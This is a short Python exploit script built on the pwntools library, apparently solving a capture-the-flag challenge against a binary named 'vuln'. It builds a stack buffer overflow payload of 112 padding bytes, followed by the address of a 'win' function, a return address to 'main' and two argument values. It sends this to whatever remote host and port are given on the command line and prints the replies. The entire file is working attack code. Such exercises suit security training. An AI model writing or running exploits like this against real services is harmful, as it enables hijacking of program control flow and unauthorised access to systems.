#!/usr/bin/env python3

import pwn
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("host", type=str)
parser.add_argument("port", type=int)
args = parser.parse_args()

elf = pwn.ELF("./vuln")
# p = elf.process()

target_eip = pwn.p32(elf.symbols["win"])
return_address = pwn.p32(elf.symbols["main"])

offset = 112

payload = b"".join(
    [
        b"A" * offset,
        target_eip,
        return_address,
        pwn.p32(0xCAFEF00D),
        pwn.p32(0xF00DF00D),
    ]
)

p = pwn.remote(args.host, args.port)

p.sendline(payload)
print(p.recv().decode("latin-1"))
print(p.recv().decode("latin-1"))

# p.interactive()
